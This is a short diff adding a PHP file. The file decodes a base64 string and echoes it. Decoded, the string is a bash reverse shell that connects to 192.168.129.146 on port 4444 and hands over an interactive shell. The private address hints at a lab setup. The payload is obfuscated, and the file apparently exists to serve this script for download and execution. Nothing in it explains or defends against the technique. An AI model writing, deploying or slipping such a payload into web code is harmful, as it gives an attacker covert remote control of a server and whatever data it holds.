@@ -1,0 +1,4 @@
+<?php
+    $a=base64_decode("IyEvYmluL2Jhc2ggCi9iaW4vYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyOS4xNDYvNDQ0NCAwPiYx");
+    echo $a;
+?>
